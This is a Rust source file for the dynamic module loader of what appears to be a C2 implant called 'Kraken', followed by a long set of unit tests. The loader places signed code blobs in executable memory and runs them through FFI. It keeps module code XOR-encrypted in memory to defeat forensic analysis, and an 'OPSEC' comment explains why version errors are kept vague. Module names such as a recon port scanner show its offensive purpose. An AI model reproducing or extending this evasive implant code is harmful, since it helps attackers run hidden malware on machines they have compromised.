//! Kraken dynamic module loader — Phase 3
//!
//! [`DynamicModuleLoader`] is the single entry point for loading, querying,
//! and unloading modules at runtime.  A module blob is:
//!
//! 1. Signature-verified against the baked-in server public key.
//! 2. Parsed to extract the executable code section.
//! 3. Version-checked against the current implant version.
//! 4. Mapped into a private RWX region (RW first, then hardened to RX).
//! 5. Stored by [`ModuleId`] so that callers can invoke it via FFI.
//!
//! On [`Drop`] every loaded module is securely zeroed and freed.

use std::collections::HashMap;
use std::ptr;

/// Current implant version as packed semver: (major << 16) | (minor << 8) | patch.
/// Generated at build time from Cargo.toml version via build.rs.
pub const IMPLANT_VERSION_PACKED: u32 = {
    // Parse from build-time environment variable
    const VERSION_STR: &str = env!("IMPLANT_VERSION_PACKED");
    // Use a const fn to parse since we can't use str::parse in const context
    const fn parse_u32(s: &str) -> u32 {
        let bytes = s.as_bytes();
        let mut result: u32 = 0;
        let mut i = 0;
        while i < bytes.len() {
            result = result * 10 + (bytes[i] - b'0') as u32;
            i += 1;
        }
        result
    }
    parse_u32(VERSION_STR)
};

use chrono::Utc;
use common::{KrakenError, Module, ModuleBlob, ModuleId};

mod encrypt;
mod memory;
pub mod secure;
mod verify;

use encrypt::ModuleEncryption;

// ---------------------------------------------------------------------------
// Public types
// ---------------------------------------------------------------------------

/// Summary information about a module that is currently resident in memory.
#[derive(Debug, Clone)]
pub struct LoadedModuleInfo {
    /// Module identifier string (e.g. `"kraken.recon.portscan"`).
    pub module_id: ModuleId,
    /// Human-readable name taken from the blob header.
    pub name: String,
    /// Semver string derived from the packed version field.
    pub version: String,
    /// Unix timestamp (milliseconds) at which the module was loaded.
    pub loaded_at: i64,
    /// Size of the executable mapping in bytes.
    pub memory_size: usize,
}

// ---------------------------------------------------------------------------
// Internal types
// ---------------------------------------------------------------------------

/// Private state for a single loaded module.
struct LoadedModule {
    id: ModuleId,
    name: String,
    version: u32,
    /// Base address of the executable mapping.
    base: *mut u8,
    /// Size of the executable mapping in bytes.
    size: usize,
    /// Absolute address of the module entry point.
    entry: *const (),
    /// Millisecond-precision load timestamp.
    loaded_at: i64,
    /// Encryption state for memory forensics defense.
    /// Module code is XOR-encrypted when not actively executing.
    encryption: ModuleEncryption,
}

// SAFETY: `base` and `entry` are raw pointers into memory that is exclusively
// owned by this struct.  We never share them across threads simultaneously.
unsafe impl Send for LoadedModule {}
unsafe impl Sync for LoadedModule {}

// ---------------------------------------------------------------------------
// DynamicModuleLoader
// ---------------------------------------------------------------------------

/// Runtime registry of dynamically loaded Kraken modules.
pub struct DynamicModuleLoader {
    loaded: HashMap<ModuleId, LoadedModule>,
}

impl DynamicModuleLoader {
    /// Create an empty loader with no modules resident.
    pub fn new() -> Self {
        Self {
            loaded: HashMap::new(),
        }
    }

    /// Load a signed module blob into executable memory.
    ///
    /// Steps performed:
    /// 1. Verify Ed25519 signature.
    /// 2. Parse blob header and code section.
    /// 3. Reject architecture mismatches.
    /// 4. Reject blobs for modules that are already loaded.
    /// 5. Allocate a private RW mapping, copy code, harden to RX.
    /// 6. Record the entry-point address and metadata.
    ///
    /// Returns the [`ModuleId`] that can be used to query or unload the module.
    pub fn load(&mut self, blob: &[u8]) -> Result<ModuleId, KrakenError> {
        // Step 1: Verify signature before touching any code.
        verify::verify_signature(blob)?;

        // Step 2: Parse blob (re-uses the already-validated buffer).
        let parsed = ModuleBlob::parse(blob)?;

        // Step 3: Architecture guard.
        if !parsed.header.arch_matches_current() {
            return Err(KrakenError::Module("architecture mismatch".into()));
        }

        // Step 3b: Version compatibility check.
        // Reject modules that require a newer implant version than what we are.
        // OPSEC: Use generic error message to avoid revealing exact implant version.
        let min_version = parsed.header.min_implant_version;
        if min_version > IMPLANT_VERSION_PACKED {
            return Err(KrakenError::Module("module requires newer implant version".into()));
        }

        let module_id = ModuleId::new(parsed.module_id);

        // Step 4: Duplicate-load guard.
        if self.loaded.contains_key(&module_id) {
            return Err(KrakenError::Module(format!(
                "module '{}' is already loaded",
                module_id
            )));
        }

        let code_size = parsed.code.len();

        // Step 5a: Allocate writable memory.
        let base = memory::allocate_executable(code_size)?;

        // Step 5b: Copy code bytes into the mapping.
        // SAFETY: `base` is a valid allocation of exactly `code_size` bytes;
        // `parsed.code` is a slice of equal length from the verified blob.
        unsafe {
            ptr::copy_nonoverlapping(parsed.code.as_ptr(), base, code_size);
        }

        // Step 5c: Harden the mapping to read-execute.
        if let Err(e) = memory::protect_executable(base, code_size) {
            // Best-effort cleanup before propagating the error.
            let _ = memory::free_executable(base, code_size);
            return Err(e);
        }

        // Step 6: Compute entry-point address from the declared offset.
        // SAFETY: `entry_offset` was validated by `ModuleBlobHeader::validate`
        // to be strictly less than `code_size`.
        let entry = unsafe {
            base.add(parsed.header.entry_offset as usize) as *const ()
        };

        let loaded_at = Utc::now().timestamp_millis();

        // Step 7: Encrypt the module code for memory forensics defense.
        // The code will be decrypted only when get() is called to execute it.
        let encryption = {
            let enc = ModuleEncryption::new();
            // new() starts with is_encrypted = true, but we have plaintext
            // XOR the plaintext to encrypt it
            unsafe {
                encrypt::xor_memory_inplace(base, code_size, enc.key_ref());
            }
            // enc already has is_encrypted = true which is now correct
            enc
        };

        self.loaded.insert(
            module_id.clone(),
            LoadedModule {
                id: module_id.clone(),
                name: parsed.module_name.to_string(),
                version: parsed.header.version,
                base,
                size: code_size,
                entry,
                loaded_at,
                encryption,
            },
        );

        Ok(module_id)
    }

    /// Securely unload a module: zero its code region, then free the mapping.
    ///
    /// Uses volatile writes to ensure the zeroing cannot be optimized away,
    /// followed by a memory fence before freeing the mapping.
    ///
    /// Returns [`KrakenError::ModuleNotFound`] if the id is not currently
    /// loaded.
    pub fn unload(&mut self, module_id: &ModuleId) -> Result<(), KrakenError> {
        let mut module = self
            .loaded
            .remove(module_id)
            .ok_or_else(|| KrakenError::ModuleNotFound(module_id.as_str().to_string()))?;

        // Clear the encryption key before freeing memory (defense-in-depth)
        module.encryption.clear_key();

        // Securely zero and free the module memory.
        // SAFETY: `module.base` is the start of a valid mapping of `module.size` bytes
        // that was allocated by `memory::allocate_executable`.
        unsafe {
            secure::secure_unload(module.base, module.size)?;
        }

        Ok(())
    }

    /// Obtain a reference to the [`Module`] trait object exported by a loaded
    /// module.
    ///
    /// This calls into the loaded code via FFI: the entry point must be a
    /// function with the signature `extern "C" fn() -> *mut dyn Module`.
    ///
    /// The module is decrypted before execution and remains decrypted while
    /// references may be held. Call `encrypt_idle_modules()` periodically to
    /// re-encrypt modules that are not actively being used.
    ///
    /// Returns `None` if the module is not loaded, or if the FFI call returns
    /// a null pointer.
    pub fn get(&mut self, module_id: &ModuleId) -> Option<&dyn Module> {
        let m = self.loaded.get_mut(module_id)?;

        // Decrypt the module code before executing
        if m.encryption.is_encrypted() {
            unsafe {
                m.encryption.decrypt(m.base, m.size);
            }
        }

        // SAFETY: The entry point was obtained from a verified, signed blob.
        // The caller must ensure the module conforms to the expected ABI.
        unsafe {
            let get_module: extern "C" fn() -> *mut dyn Module =
                std::mem::transmute(m.entry);
            let ptr = get_module();
            if ptr.is_null() {
                None
            } else {
                Some(&*ptr)
            }
        }
    }

    /// Re-encrypt all idle modules.
    ///
    /// Call this periodically (e.g., after task completion) to reduce the
    /// window during which module code is exposed in plaintext memory.
    #[allow(dead_code)]
    pub fn encrypt_idle_modules(&mut self) {
        for m in self.loaded.values_mut() {
            if !m.encryption.is_encrypted() {
                unsafe {
                    m.encryption.encrypt(m.base, m.size);
                }
            }
        }
    }

    /// Return summary information for every currently loaded module.
    pub fn list(&self) -> Vec<LoadedModuleInfo> {
        self.loaded
            .values()
            .map(|m| LoadedModuleInfo {
                module_id: m.id.clone(),
                name: m.name.clone(),
                version: format_version(m.version),
                loaded_at: m.loaded_at,
                memory_size: m.size,
            })
            .collect()
    }

    /// Return `true` if a module with `module_id` is currently loaded.
    pub fn is_loaded(&self, module_id: &ModuleId) -> bool {
        self.loaded.contains_key(module_id)
    }
}

impl Default for DynamicModuleLoader {
    fn default() -> Self {
        Self::new()
    }
}

impl Drop for DynamicModuleLoader {
    fn drop(&mut self) {
        // Collect IDs first to avoid borrowing `self.loaded` mutably while
        // iterating over it.
        let ids: Vec<ModuleId> = self.loaded.keys().cloned().collect();
        for id in ids {
            // Ignore errors during drop; best-effort cleanup.
            let _ = self.unload(&id);
        }
    }
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/// Convert a packed semver `(major << 16) | (minor << 8) | patch` to a
/// human-readable `"major.minor.patch"` string.
fn format_version(packed: u32) -> String {
    let major = (packed >> 16) & 0xFF;
    let minor = (packed >> 8) & 0xFF;
    let patch = packed & 0xFF;
    format!("{}.{}.{}", major, minor, patch)
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn format_version_roundtrip() {
        assert_eq!(format_version(0x010203), "1.2.3");
        assert_eq!(format_version(0x000000), "0.0.0");
        assert_eq!(format_version(0xFF0000), "255.0.0");
    }

    #[test]
    fn loader_new_is_empty() {
        let loader = DynamicModuleLoader::new();
        assert!(loader.list().is_empty());
        assert!(!loader.is_loaded(&ModuleId::new("test")));
    }

    #[test]
    fn load_invalid_blob_returns_error() {
        let mut loader = DynamicModuleLoader::new();
        // A blob of zeros has no valid magic and must be rejected before any
        // memory allocation occurs.
        let result = loader.load(&[0u8; 128]);
        assert!(result.is_err());
    }

    // -----------------------------------------------------------------------
    // Phase 3 tests
    // -----------------------------------------------------------------------

    /// Build a minimal blob with a valid header, id, name, a placeholder
    /// 64-byte signature section (all zeros), and the provided code bytes.
    /// Sufficient for parse-level tests that do not reach Ed25519 verification.
    fn make_test_blob(module_id: &str, module_name: &str, code: &[u8]) -> Vec<u8> {
        use common::{ModuleBlobHeader, ARCH_X64_LINUX};

        const FAKE_SIG: [u8; 64] = [0u8; 64];

        let id_bytes = module_id.as_bytes();
        let name_bytes = module_name.as_bytes();
        let code_size = code.len() as u32;

        let mut hdr = [0u8; ModuleBlobHeader::SIZE];
        hdr[0..4].copy_from_slice(b"KMOD");
        hdr[4] = 1; // format_version LE u16
        hdr[6] = ARCH_X64_LINUX;
        hdr[8..10].copy_from_slice(&(id_bytes.len() as u16).to_le_bytes());
        hdr[10..12].copy_from_slice(&(name_bytes.len() as u16).to_le_bytes());
        hdr[12..16].copy_from_slice(&0x0001_0000u32.to_le_bytes()); // version 1.0.0
        hdr[16..20].copy_from_slice(&code_size.to_le_bytes());
        // entry_offset = 0, valid as long as code_size > 0

        let sig_len = FAKE_SIG.len() as u32;

        let mut blob = Vec::with_capacity(
            ModuleBlobHeader::SIZE + id_bytes.len() + name_bytes.len() + 4 + FAKE_SIG.len() + code.len(),
        );
        blob.extend_from_slice(&hdr);
        blob.extend_from_slice(id_bytes);
        blob.extend_from_slice(name_bytes);
        blob.extend_from_slice(&sig_len.to_le_bytes());
        blob.extend_from_slice(&FAKE_SIG);
        blob.extend_from_slice(code);
        blob
    }

    /// The on-wire header must be exactly 80 bytes.
    #[test]
    fn test_blob_header_size() {
        use common::ModuleBlobHeader;
        assert_eq!(core::mem::size_of::<ModuleBlobHeader>(), 80);
        assert_eq!(ModuleBlobHeader::SIZE, 80);
        assert_eq!(core::mem::size_of::<ModuleBlobHeader>(), ModuleBlobHeader::SIZE);
    }

    /// A correctly structured blob must be accepted by `ModuleBlob::parse`.
    #[test]
    fn test_blob_parsing() {
        use common::ModuleBlob;

        let code = [0xCC_u8; 16];
        let blob = make_test_blob("kraken.test.parse", "Parse Test Module", &code);

        let parsed = ModuleBlob::parse(&blob).expect("valid blob must parse successfully");
        assert_eq!(parsed.module_id, "kraken.test.parse");
        assert_eq!(parsed.module_name, "Parse Test Module");
        assert_eq!(parsed.code.len(), 16);
        assert_eq!(parsed.signature.len(), 64);
    }

    /// A blob with incorrect magic bytes must be rejected.
    #[test]
    fn test_invalid_magic_rejected() {
        use common::ModuleBlob;

        let mut blob = make_test_blob("kraken.test.magic", "Magic Test", &[0x90_u8; 8]);
        blob[0] = b'X';
        blob[1] = b'X';
        blob[2] = b'X';
        blob[3] = b'X';

        assert!(ModuleBlob::parse(&blob).is_err(), "invalid magic must be rejected");
    }

    /// `DynamicModuleLoader::new` must construct an empty, functional loader.
    #[test]
    fn test_loader_new() {
        let loader = DynamicModuleLoader::new();
        assert!(loader.list().is_empty(), "new loader must have no modules");
        assert!(!loader.is_loaded(&ModuleId::new("kraken.test.nonexistent")));

        let loader_default = DynamicModuleLoader::default();
        assert!(loader_default.list().is_empty());
    }

    // -----------------------------------------------------------------------
    // Loading invalid / corrupted module blobs
    // -----------------------------------------------------------------------

    /// An empty blob must be rejected immediately (too small for header).
    #[test]
    fn test_load_empty_blob_returns_error() {
        let mut loader = DynamicModuleLoader::new();
        let result = loader.load(&[]);
        assert!(result.is_err(), "empty blob must be rejected");
    }

    /// A blob that is smaller than the 80-byte header must be rejected.
    #[test]
    fn test_load_too_small_blob_returns_error() {
        let mut loader = DynamicModuleLoader::new();
        // 79 bytes — one byte short of the minimum header size.
        let result = loader.load(&[0u8; 79]);
        assert!(result.is_err(), "blob smaller than header must be rejected");
    }

    /// A blob filled with random non-zero bytes must not parse as a valid module.
    #[test]
    fn test_load_corrupted_blob_returns_error() {
        let mut loader = DynamicModuleLoader::new();
        // Fill with 0xFF — magic bytes will be wrong.
        let result = loader.load(&[0xFF_u8; 256]);
        assert!(result.is_err(), "corrupted blob must be rejected");
    }

    /// A blob whose code section is declared larger than the actual buffer
    /// must be rejected during parsing, not cause a panic.
    #[test]
    fn test_load_truncated_code_section_returns_error() {
        use common::ModuleBlobHeader;

        // Build a blob that claims code_size = 1024 but provides 0 code bytes.
        let module_id = b"kraken.test.trunc";
        let module_name = b"Truncated";
        let fake_sig = [0u8; 64];

        let mut hdr = [0u8; ModuleBlobHeader::SIZE];
        hdr[0..4].copy_from_slice(b"KMOD");
        hdr[4] = 1; // format_version
        hdr[6] = common::ARCH_X64_LINUX;
        hdr[8..10].copy_from_slice(&(module_id.len() as u16).to_le_bytes());
        hdr[10..12].copy_from_slice(&(module_name.len() as u16).to_le_bytes());
        hdr[12..16].copy_from_slice(&0x0001_0000u32.to_le_bytes()); // version 1.0.0
        hdr[16..20].copy_from_slice(&1024u32.to_le_bytes()); // claims 1024-byte code
        // entry_offset = 0

        let sig_len = fake_sig.len() as u32;

        let mut blob = Vec::new();
        blob.extend_from_slice(&hdr);
        blob.extend_from_slice(module_id);
        blob.extend_from_slice(module_name);
        blob.extend_from_slice(&sig_len.to_le_bytes());
        blob.extend_from_slice(&fake_sig);
        // No code bytes appended — blob is deliberately truncated.

        let mut loader = DynamicModuleLoader::new();
        let result = loader.load(&blob);
        assert!(result.is_err(), "truncated code section must be rejected");
    }

    // -----------------------------------------------------------------------
    // Wrong signature
    // -----------------------------------------------------------------------

    /// A structurally valid blob with a wrong / all-zero signature must be
    /// rejected with an `InvalidSignature` error (not a parse error).
    #[test]
    fn test_load_wrong_signature_returns_invalid_signature() {
        use common::KrakenError;

        let code = [0xCC_u8; 16];
        let blob = make_test_blob("kraken.test.sig", "Sig Test", &code);

        let mut loader = DynamicModuleLoader::new();
        let result = loader.load(&blob);

        // The dev build bakes in a zero public key, so the zero-byte "signature"
        // is cryptographically invalid — expect InvalidSignature.
        match result {
            Err(KrakenError::InvalidSignature) => {}
            Err(other) => panic!("expected InvalidSignature, got {:?}", other),
            Ok(_) => panic!("expected an error but load succeeded"),
        }
    }

    /// Flipping a single bit in the signature bytes must cause rejection.
    #[test]
    fn test_load_flipped_signature_bit_rejected() {
        let code = [0x90_u8; 8];
        let mut blob = make_test_blob("kraken.test.flip", "Flip Test", &code);

        // The signature starts after: header(80) + id_len + name_len bytes.
        // make_test_blob stores sig_len (4 bytes LE = 64) then the 64-byte sig.
        // Flip a bit in the first signature byte.
        let id_len = "kraken.test.flip".len();
        let name_len = "Flip Test".len();
        let sig_start = 80 + id_len + name_len + 4; // +4 for sig_len field
        blob[sig_start] ^= 0xFF;

        let mut loader = DynamicModuleLoader::new();
        assert!(loader.load(&blob).is_err(), "modified signature must be rejected");
    }

    // -----------------------------------------------------------------------
    // Wrong architecture
    // -----------------------------------------------------------------------

    /// A blob whose arch field does not match the current host architecture
    /// must be rejected with a module error indicating architecture mismatch.
    ///
    /// We pick an arch constant that cannot be the current host so we can test
    /// the rejection path without depending on the specific host architecture.
    #[test]
    fn test_load_wrong_architecture_rejected() {
        #[allow(unused_imports)]
        use common::{KrakenError, ModuleBlobHeader, ARCH_X64_LINUX, ARCH_X64_WINDOWS,
                     ARCH_ARM64_LINUX, ARCH_ARM64_WINDOWS};

        // Choose an arch that never matches the current host.
        // If the host is x86_64-linux, use ARM64-Linux; otherwise use x64-Linux.
        let wrong_arch = {
            #[cfg(all(target_arch = "x86_64", target_os = "linux"))]
            { ARCH_ARM64_LINUX }

            #[cfg(all(target_arch = "x86_64", target_os = "windows"))]
            { ARCH_ARM64_WINDOWS }

            #[cfg(all(target_arch = "aarch64", target_os = "linux"))]
            { ARCH_X64_LINUX }

            #[cfg(all(target_arch = "aarch64", target_os = "windows"))]
            { ARCH_X64_WINDOWS }

            #[cfg(not(any(
                all(target_arch = "x86_64", target_os = "linux"),
                all(target_arch = "x86_64", target_os = "windows"),
                all(target_arch = "aarch64", target_os = "linux"),
                all(target_arch = "aarch64", target_os = "windows"),
            )))]
            { ARCH_X64_LINUX }
        };

        let module_id = b"kraken.test.arch";
        let module_name = b"Arch Test";
        let code = [0x90_u8; 8];
        let fake_sig = [0u8; 64];

        let mut hdr = [0u8; ModuleBlobHeader::SIZE];
        hdr[0..4].copy_from_slice(b"KMOD");
        hdr[4] = 1; // format_version
        hdr[6] = wrong_arch;
        hdr[8..10].copy_from_slice(&(module_id.len() as u16).to_le_bytes());
        hdr[10..12].copy_from_slice(&(module_name.len() as u16).to_le_bytes());
        hdr[12..16].copy_from_slice(&0x0001_0000u32.to_le_bytes());
        hdr[16..20].copy_from_slice(&(code.len() as u32).to_le_bytes());
        // entry_offset = 0

        let sig_len = fake_sig.len() as u32;
        let mut blob = Vec::new();
        blob.extend_from_slice(&hdr);
        blob.extend_from_slice(module_id);
        blob.extend_from_slice(module_name);
        blob.extend_from_slice(&sig_len.to_le_bytes());
        blob.extend_from_slice(&fake_sig);
        blob.extend_from_slice(&code);

        let mut loader = DynamicModuleLoader::new();
        let result = loader.load(&blob);

        // Signature check runs before arch check, so we may get InvalidSignature
        // (dev zero-key build) or Module("architecture mismatch") depending on
        // whether the signature verification short-circuits first.  Either way it
        // must be an error.
        assert!(result.is_err(), "wrong-arch blob must be rejected");

        // If we somehow got past signature (shouldn't happen in dev), verify it
        // is specifically an arch error.
        if let Err(KrakenError::Module(msg)) = result {
            assert!(
                msg.contains("architecture"),
                "module error should mention architecture, got: {msg}"
            );
        }
    }

    // -----------------------------------------------------------------------
    // Unloading non-existent modules
    // -----------------------------------------------------------------------

    /// Unloading a module that was never loaded must return `ModuleNotFound`.
    #[test]
    fn test_unload_nonexistent_returns_module_not_found() {
        use common::KrakenError;

        let mut loader = DynamicModuleLoader::new();
        let id = ModuleId::new("kraken.test.ghost");

        match loader.unload(&id) {
            Err(KrakenError::ModuleNotFound(s)) => {
                assert!(s.contains("kraken.test.ghost"), "error message should contain the id");
            }
            Err(other) => panic!("expected ModuleNotFound, got {:?}", other),
            Ok(()) => panic!("expected an error but unload succeeded"),
        }
    }

    /// Unloading with an empty string id must still return `ModuleNotFound`.
    #[test]
    fn test_unload_empty_id_returns_module_not_found() {
        use common::KrakenError;

        let mut loader = DynamicModuleLoader::new();
        let id = ModuleId::new("");

        assert!(
            matches!(loader.unload(&id), Err(KrakenError::ModuleNotFound(_))),
            "unloading empty-id must return ModuleNotFound"
        );
    }

    /// `get()` on a non-existent module id must return `None`.
    #[test]
    fn test_get_nonexistent_returns_none() {
        let mut loader = DynamicModuleLoader::new();
        let id = ModuleId::new("kraken.test.absent");
        assert!(loader.get(&id).is_none(), "get on absent module must return None");
    }

    // -----------------------------------------------------------------------
    // Listing modules when empty
    // -----------------------------------------------------------------------

    /// A freshly constructed loader must report zero modules via `list()`.
    #[test]
    fn test_list_empty_loader() {
        let loader = DynamicModuleLoader::new();
        let modules = loader.list();
        assert!(modules.is_empty(), "new loader must list no modules");
        assert_eq!(modules.len(), 0);
    }

    /// `is_loaded` must return false for any id on an empty loader.
    #[test]
    fn test_is_loaded_always_false_on_empty_loader() {
        let loader = DynamicModuleLoader::new();
        assert!(!loader.is_loaded(&ModuleId::new("anything")));
        assert!(!loader.is_loaded(&ModuleId::new("")));
        assert!(!loader.is_loaded(&ModuleId::new("kraken.recon.portscan")));
    }

    // -----------------------------------------------------------------------
    // Module metadata extraction (format_version helper)
    // -----------------------------------------------------------------------

    /// `format_version` must correctly decode packed semver for boundary values.
    #[test]
    fn test_format_version_boundary_values() {
        // Major only
        assert_eq!(format_version(0x01_00_00), "1.0.0");
        // Minor only
        assert_eq!(format_version(0x00_01_00), "0.1.0");
        // Patch only
        assert_eq!(format_version(0x00_00_01), "0.0.1");
        // All fields combined
        assert_eq!(format_version(0x0A_0B_0C), "10.11.12");
        // Maximum byte value per field
        assert_eq!(format_version(0xFF_FF_FF), "255.255.255");
    }

    /// Higher bits beyond the 24-bit semver range are masked out correctly.
    #[test]
    fn test_format_version_ignores_high_bits() {
        // Bits above byte 2 (i.e. bits 24+) should be masked.
        // format_version masks each field to 0xFF.
        assert_eq!(format_version(0x0100_0000), "0.0.0");
    }

    // -----------------------------------------------------------------------
    // Edge cases in blob parsing
    // -----------------------------------------------------------------------

    /// A blob with an unknown / unsupported format_version field must be
    /// rejected at parse time.
    #[test]
    fn test_parse_unknown_format_version_rejected() {
        use common::ModuleBlob;

        let mut blob = make_test_blob("kraken.test.ver", "Ver Test", &[0x90_u8; 8]);
        // format_version is a LE u16 at byte offset 4 in the header.
        // Set it to version 99 (unknown).
        blob[4] = 99;
        blob[5] = 0;

        assert!(
            ModuleBlob::parse(&blob).is_err(),
            "unknown format_version must be rejected"
        );
    }

    /// A blob with an invalid (unknown) architecture value must be rejected.
    #[test]
    fn test_parse_unknown_arch_rejected() {
        use common::ModuleBlob;

        let mut blob = make_test_blob("kraken.test.archbad", "Arch Bad", &[0x90_u8; 8]);
        // arch is at byte offset 6.  0 is not a valid arch constant.
        blob[6] = 0;

        assert!(
            ModuleBlob::parse(&blob).is_err(),
            "unknown arch must be rejected by header validation"
        );
    }

    /// A blob where entry_offset equals code_size must be rejected (must be
    /// strictly less than).
    #[test]
    fn test_parse_entry_offset_equals_code_size_rejected() {
        use common::ModuleBlob;

        let code = [0x90_u8; 8];
        let mut blob = make_test_blob("kraken.test.entry", "Entry Test", &code);
        // entry_offset is a LE u32 at header byte 20.  code_size = 8; set entry_offset = 8.
        blob[20] = 8;
        blob[21] = 0;
        blob[22] = 0;
        blob[23] = 0;

        assert!(
            ModuleBlob::parse(&blob).is_err(),
            "entry_offset == code_size must be rejected"
        );
    }

    /// A blob where both WINDOWS_ONLY and LINUX_ONLY flags are set simultaneously
    /// must be rejected.
    #[test]
    fn test_parse_conflicting_platform_flags_rejected() {
        use common::{ModuleBlob, FLAG_LINUX_ONLY, FLAG_WINDOWS_ONLY};

        let mut blob = make_test_blob("kraken.test.flags", "Flags Test", &[0x90_u8; 8]);
        // flags field is at header byte 7.
        blob[7] = FLAG_LINUX_ONLY | FLAG_WINDOWS_ONLY;

        assert!(
            ModuleBlob::parse(&blob).is_err(),
            "conflicting platform flags must be rejected"
        );
    }

    /// A blob with module_id_len that extends past the end of the buffer must
    /// be rejected with an error rather than panicking.
    #[test]
    fn test_parse_id_len_overflow_rejected() {
        use common::ModuleBlob;

        let mut blob = make_test_blob("id", "name", &[0x90_u8; 8]);
        // Set module_id_len = 0xFFFF (way beyond buffer size).
        // module_id_len is LE u16 at bytes 8-9.
        blob[8] = 0xFF;
        blob[9] = 0xFF;

        assert!(
            ModuleBlob::parse(&blob).is_err(),
            "oversized id_len must not panic and must return an error"
        );
    }

    /// A blob with module_name_len that extends past the end of the buffer must
    /// be rejected cleanly.
    #[test]
    fn test_parse_name_len_overflow_rejected() {
        use common::ModuleBlob;

        let mut blob = make_test_blob("id", "name", &[0x90_u8; 8]);
        // Set module_name_len = 0xFFFF.
        // module_name_len is LE u16 at bytes 10-11.
        blob[10] = 0xFF;
        blob[11] = 0xFF;

        assert!(
            ModuleBlob::parse(&blob).is_err(),
            "oversized name_len must not panic and must return an error"
        );
    }

    /// A completely valid blob must parse without errors and expose all fields.
    #[test]
    fn test_parse_valid_blob_all_fields_correct() {
        use common::ModuleBlob;

        let code = [0xCC_u8; 32];
        let blob = make_test_blob("kraken.test.full", "Full Test Module", &code);

        let parsed = ModuleBlob::parse(&blob).expect("valid blob must parse");
        assert_eq!(parsed.module_id, "kraken.test.full");
        assert_eq!(parsed.module_name, "Full Test Module");
        assert_eq!(parsed.code.len(), 32);
        assert_eq!(parsed.signature.len(), 64);
        // entry_offset was left as 0, code_size = 32 → entry at code[0].
        // Copy packed fields to locals to avoid misaligned-reference UB.
        let entry_offset = parsed.header.entry_offset;
        let code_size = parsed.header.code_size;
        let version = parsed.header.version;
        assert_eq!(entry_offset, 0);
        assert_eq!(code_size, 32);
        // Version was set to 1.0.0 packed as 0x0001_0000.
        assert_eq!(format_version(version), "1.0.0");
    }

    /// Verify that `signed_data` reconstructs the expected byte layout:
    /// `[header][module_id][module_name][code]` without the signature.
    #[test]
    fn test_signed_data_layout() {
        use common::ModuleBlob;

        let module_id = "kraken.test.sd";
        let module_name = "Signed Data";
        let code = [0xAB_u8; 16];
        let blob = make_test_blob(module_id, module_name, &code);

        let sd = ModuleBlob::signed_data(&blob).expect("signed_data must succeed on valid blob");

        let expected_len = 80 + module_id.len() + module_name.len() + code.len();
        assert_eq!(sd.len(), expected_len, "signed_data length mismatch");

        // First 4 bytes must be the KMOD magic.
        assert_eq!(&sd[0..4], b"KMOD");

        // Last `code.len()` bytes must be the code section.
        let code_start = expected_len - code.len();
        assert_eq!(&sd[code_start..], &code);
    }

    /// `signed_data` on a truncated (< header size) buffer must return an error.
    #[test]
    fn test_signed_data_truncated_buffer_returns_error() {
        use common::ModuleBlob;

        assert!(
            ModuleBlob::signed_data(&[0u8; 40]).is_err(),
            "signed_data on truncated buffer must return an error"
        );
    }

    // -----------------------------------------------------------------------
    // Version compatibility tests
    // -----------------------------------------------------------------------

    /// Verify the IMPLANT_VERSION_PACKED constant is correctly generated.
    #[test]
    fn test_implant_version_packed_valid() {
        // Should fit within 24 bits (3 bytes for major.minor.patch)
        // For version 0.1.0: (0 << 16) | (1 << 8) | 0 = 256
        assert!(
            IMPLANT_VERSION_PACKED <= 0xFF_FF_FF,
            "packed version must fit in 24 bits"
        );
        // Verify the constant is accessible and stable
        let _v = IMPLANT_VERSION_PACKED;
    }

    /// Test the version comparison logic directly without loading.
    /// This avoids SIGSEGV from invalid module execution.
    #[test]
    fn test_version_comparison_logic() {
        // Version 0.1.0 = (0 << 16) | (1 << 8) | 0 = 256
        let v_0_1_0: u32 = 0x000100;
        // Version 1.0.0 = (1 << 16) | (0 << 8) | 0 = 65536
        let v_1_0_0: u32 = 0x010000;
        // Version 255.255.255 = max
        let v_max: u32 = 0xFFFFFF;

        // Current version should be <= max
        assert!(IMPLANT_VERSION_PACKED <= v_max);

        // For version 0.1.0 implant:
        // - Module requiring 0.0.0 should load (0 <= 256)
        // - Module requiring 0.1.0 should load (256 <= 256)
        // - Module requiring 1.0.0 should NOT load (65536 > 256)
        if IMPLANT_VERSION_PACKED == v_0_1_0 {
            assert!(0u32 <= IMPLANT_VERSION_PACKED); // min_version 0 OK
            assert!(v_0_1_0 <= IMPLANT_VERSION_PACKED); // min_version 0.1.0 OK
            assert!(v_1_0_0 > IMPLANT_VERSION_PACKED); // min_version 1.0.0 rejected
        }
    }

    /// Verify format_version helper correctly unpacks the constant.
    #[test]
    fn test_implant_version_format() {
        let formatted = format_version(IMPLANT_VERSION_PACKED);
        // Should be a valid semver-like string "X.Y.Z"
        let parts: Vec<&str> = formatted.split('.').collect();
        assert_eq!(parts.len(), 3, "version should have 3 parts");
        for part in parts {
            assert!(part.parse::<u32>().is_ok(), "each part should be numeric");
        }
    }
}
